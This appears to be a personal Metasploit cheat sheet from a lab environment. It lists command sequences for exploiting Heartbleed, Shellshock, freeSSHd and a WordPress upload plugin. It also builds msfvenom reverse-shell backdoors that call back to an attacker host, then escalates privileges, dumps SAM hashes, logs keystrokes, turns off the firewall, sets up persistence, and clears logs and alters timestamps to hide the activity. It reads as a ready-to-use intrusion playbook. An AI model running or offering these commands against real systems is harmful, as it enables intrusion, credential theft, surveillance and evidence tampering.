# Metasploit

## Exploiting Heartbleed
In this example, cookie information was returned, which can be used for session hijacking.

```shell
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 172.17.19.65
set RPORT 443
set VERBOSE true
exploit
```

## Exploiting Shellshock
```shell
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 172.17.19.67
set RHOST 172.17.19.68
set TARGETURI http://172.17.19.68/cgi-bin/shellshock
exploit
```

## Create Payload to Escalate Privileges and Dump SAM Hashes
```shell
msfconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.17.19.67 --arch x86 --platform windows -f exe -o Desktop/Exploit.exe

# To handle exploits launched outside the framework
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.17.19.67
exploit -j -z

# List active sessions once Exploit.exe is executed on target system
sessions

# Connect to session
sessions -i 1

# Get currently logged in user in the session
getuid

# Escalate privileges using the Service-Named Pipe Impersonation (In Memory/Admin) technique
getsystem -t 1

# Dump SAM hashes
run hashdump

# Clear the event logs remotely
clearev
```

## freeSSHd Authentication Bypass
```shell
use exploit/windows/ssh/freesshd_authbypass

# View configuration options of exploit
show options

set RHOST 172.17.19.61
set RPORT 45

# Exploit by performing a dictionary attack to obtain username; once obtained, malicious code is uploaded and executed to obtain a session
exploit

# Get system information
sysinfo

# View IP configuration
ipconfig

# Grab a screenshot of the interactive desktop
screenshot

# Locate files on victim's system
search -f page.sys

# Download a file from the remote system
download test.txt

# Capture all keyboard input from victim's system
keyscan_start

# Dump captured keyboard input
keyscan_dump

# View MACE attributes
timestomp secret.txt -v

# Change modified timestamp
timestomp secret.txt -m "06/15/2012 12:57:37"

# Change creation timestamp
timestomp secret.txt -c "06/15/2012 12:57:37"

# Change access timestamp
timestomp secret.txt -a "06/15/2012 12:57:37"

# Change entry modified timestamp
timestomp secret.txt -e "06/15/2012 12:57:37"

# Shut down a victimâ€™s system
shutdown
```

## Disable Windows Firewall and Maintain Persistent Connection
```shell
msfconsole
msfvenom --platform windows --arch x86_64 -f exe -o Desktop/Backdoor.exe -p windows/x64/meterpreter/reverse_tcp LHOST=172.17.19.67

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.17.19.67
show options
exploit -j -z
sessions -i 1

# Access command shell of victim
execute -f cmd.exe -c -H
interact 1

# View firewall status and disable
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off

# Create a persistent connection
getsystem
migrate 2517
run metsvc -A

# Connect to the persistent connection (ran this after rebooting victim system to test connection)
msfconsole
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set LPORT 31337
set RHOST 172.17.19.66
exploit

# Clear logs
clearev
```

## Exploit Wordpress Plugin
```shell
msfconsole
use exploit/windows/webapp/wp_nmediawebsite_file_upload
show options
set RHOST 172.17.19.66
set TARGETURI http://172.17.19.66/test/
exploit
```

## Buffer Overflow Offset Detection and Payload Creation
```shell
# Creates a pattern that is 1000 characters in length to be used as input
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

# Uses the pattern length along with the memory address of when the program crashed and returns the offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 41366641

# Create the buffer overflow payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4445 -f python -b "\x00\x0a\x0d"
```